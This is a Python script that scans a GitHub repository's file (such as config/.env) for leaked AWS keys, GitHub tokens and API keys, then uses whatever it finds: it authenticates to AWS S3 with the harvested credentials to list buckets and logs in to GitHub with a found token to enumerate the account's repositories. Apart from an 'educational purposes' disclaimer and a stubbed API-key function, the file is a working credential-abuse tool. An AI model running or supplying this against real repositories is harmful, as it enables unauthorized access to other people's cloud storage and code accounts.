import requests
import re
import boto3
import os
import logging
from github import Github
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# Configuration
SECRET_KEYWORDS = ['AWS_SECRET_ACCESS_KEY', 'AWS_ACCESS_KEY_ID', 'GITHUB_TOKEN', 'API_KEY']
REPO_URL = 'https://api.github.com/repos/myorg/myrepo'
TARGET_FILE_PATH = 'config/.env'

# GitHub configuration from environment variable
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
if not GITHUB_TOKEN:
    raise ValueError("GitHub token must be set as an environment variable.")

# AWS Configuration from environment variables
AWS_REGION = os.getenv('AWS_REGION', 'us-west-2')

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

def fetch_repo_files(repo_url, token):
    """Fetch files from the GitHub repository using the GitHub API, handling pagination."""
    headers = {'Authorization': f'token {token}'}
    session = requests.Session()
    retries = Retry(total=5, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
    session.mount('https://', HTTPAdapter(max_retries=retries))
    
    files = []
    page = 1
    while True:
        response = session.get(f'{repo_url}/contents/?page={page}', headers=headers)
        response.raise_for_status()
        data = response.json()
        if not data:
            break
        files.extend(data)
        page += 1
    return files

def search_for_secrets(file_url, keywords):
    """Search for secrets in the file content using regex patterns."""
    response = requests.get(file_url)
    response.raise_for_status()
    content = response.text

    # Improved regex patterns
    secrets_found = {}
    for keyword in keywords:
        pattern = re.compile(rf'{keyword}=([^\s\'"]+)', re.MULTILINE)
        secrets_found[keyword] = pattern.findall(content)
    return secrets_found

def access_s3_bucket(secret_key, access_key, bucket_name):
    """Access an S3 bucket using discovered credentials."""
    s3_client = boto3.client('s3', region_name=AWS_REGION, aws_secret_access_key=secret_key, aws_access_key_id=access_key)
    try:
        buckets = s3_client.list_buckets()
        if bucket_name in [bucket['Name'] for bucket in buckets['Buckets']]:
            logger.info(f"Bucket '{bucket_name}' is accessible with the provided credentials.")
        else:
            logger.info(f"Bucket '{bucket_name}' not found or not accessible.")
    except Exception as e:
        logger.error(f"Failed to access S3 bucket: {e}")

def use_github_token(token):
    """Use GitHub token to access private repositories or perform actions."""
    g = Github(token)
    user = g.get_user()
    logger.info(f"Authenticated as: {user.login}")
    for repo in user.get_repos():
        logger.info(f"Repo: {repo.name}")

def simulate_api_key_exploitation(api_key):
    """Simulate API key exploitation."""
    logger.info(f"Simulating API key exploitation with key: {api_key}")
    # Implement specific API key logic here

def exploit_secret(secret, keyword):
    """Simulate exploiting a found secret based on its type."""
    if 'AWS_SECRET' in keyword:
        try:
            access_key = re.search(r'AWS_ACCESS_KEY_ID=([^ \n]*)', secret).group(1)
            secret_key = re.search(r'AWS_SECRET_ACCESS_KEY=([^ \n]*)', secret).group(1)
            bucket_name = 'example-bucket'  # Replace with dynamic bucket discovery if needed
            access_s3_bucket(secret_key, access_key, bucket_name)
        except AttributeError:
            logger.warning(f"Invalid AWS secret format found: {secret}")
    elif 'GITHUB_TOKEN' in keyword:
        use_github_token(secret)
    elif 'API_KEY' in keyword:
        simulate_api_key_exploitation(secret)
    else:
        logger.warning(f"Unhandled secret type: {keyword}")

def main():
    logger.info("Disclaimer: This script is for educational purposes only. Unauthorized use is illegal.")

    repo_url = input("Enter the GitHub repository URL (e.g., https://api.github.com/repos/myorg/myrepo): ")
    target_file_path = input("Enter the file path to search for secrets (e.g., config/.env): ")

    try:
        # Fetch files from the GitHub repository
        files = fetch_repo_files(repo_url, GITHUB_TOKEN)
        
        # Find the specific file
        file_urls = [file['download_url'] for file in files if file['path'] == target_file_path]
        
        if not file_urls:
            logger.info(f"No target file '{target_file_path}' found in repository.")
            return
        
        # Search for secrets in the target file
        for file_url in file_urls:
            secrets_found = search_for_secrets(file_url, SECRET_KEYWORDS)
            for keyword, secrets in secrets_found.items():
                for secret in secrets:
                    logger.info(f"Found {keyword}: {secret}")
                    exploit_secret(secret, keyword)
    
    except requests.RequestException as e:
        logger.error(f"Error with HTTP requests: {e}")
    except Exception as e:
        logger.error(f"An error occurred: {e}")

if __name__ == '__main__':
    main()
